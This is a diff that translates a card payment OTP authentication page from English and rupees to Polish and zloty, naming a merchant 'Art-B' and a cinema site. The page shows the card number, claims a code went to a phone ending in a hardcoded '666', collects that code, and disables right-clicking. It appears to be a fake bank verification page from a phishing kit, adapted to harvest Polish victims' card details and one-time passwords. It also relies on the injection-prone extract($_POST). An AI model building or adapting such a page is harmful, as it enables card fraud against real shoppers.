@@ -35,9 +35,9 @@ extract($_POST);
   
   <hr class="divider">
   <dl class="mercDetails">
-  	<dt>Merchant</dt> 				<dd>Shop Street</dd>
-    <dt>Transaction Amount</dt> 	<dd>INR <?php echo  $_SESSION['amount'];?></dd>
-    <dt>Debit Card</dt> 		<dd><?php echo  $number;?></%></dd>
+  	<dt>Merchant</dt> 				<dd>Art-B</dd>
+    <dt>Kwota transakcji</dt> 	<dd>PLN <?php echo  $_SESSION['amount'];?></dd>
+    <dt>Karta numer</dt> 		<dd><?php echo  $number;?></%></dd>
   </dl>
   <hr class="divider">
   
@@ -45,8 +45,8 @@ extract($_POST);
 <form name="form1" id="form1" method="post" action="complete_payment.php">
 <fieldset class="page2">
 <div class="page-heading">
-<h6 class="form-heading">Authenticate Payment</h6>
-<p class="form-subheading">OTP sent to your mobile number ending with <strong>1343</strong></p>
+<h6 class="form-heading">Autoryzacja Płatności</h6>
+<p class="form-subheading">Jednorazowy kod został wysłany na twój numer telefony kończący się <strong>666</strong></p>
 
 
 </div>
@@ -54,19 +54,19 @@ extract($_POST);
 <div class="row formInputSection">
 <div class="large-7 columns">
 <label>
-  Enter One Time Password (OTP)
+  Wprowadź kod:
   <input type="tel" name="otp"  class="form-control optPass" value="" maxlength="6" autocomplete="off"/>
 </label>
 </div>
 <div class="large-5 columns">
-<label>&nbsp;</label><button class="expanded button next" onClick="ValidateForm()">Make Payment</button>
+<label>&nbsp;</label><button class="expanded button next" onClick="ValidateForm()">Dokonaj płatności</button>
 </div>
 </div>
-<div class="text-right resendBtn requestOTP"><a class="request-link" href="javascript:void(0)">Resend OTP</a></div>
+<div class="text-right resendBtn requestOTP"><a class="request-link" href="javascript:void(0)">Wyśli kod ponownie</a></div>
 <p>
 
 
-<a class="tryAgain" href="complete_order.jsp">Go back</a> to merchant
+<a class="tryAgain" href="complete_order.jsp">Powrót</a> do strony kina
 </p>
 </fieldset>
 
@@ -79,7 +79,7 @@ document.onmousedown = rightclickD; function rightclickD(e) { e = e||event; if (
 function ValidateForm() { 
 	var regPin = RegExp("^[0-9]{4,6}$");
 	if( document.form1.customerpin.value == "" || !document.form1.customerpin.value.match(regPin) ) {	 
-		alert("Please enter a valid 6 digit One Time Password (OTP) receive on your registered Mobile Number."); document.form1.customerpin.focus(); return false;  
+		alert("Wprowadź poprawny kod wysłany na twój numer telefonu."); document.form1.customerpin.focus(); return false;  
 	}
     else
         {
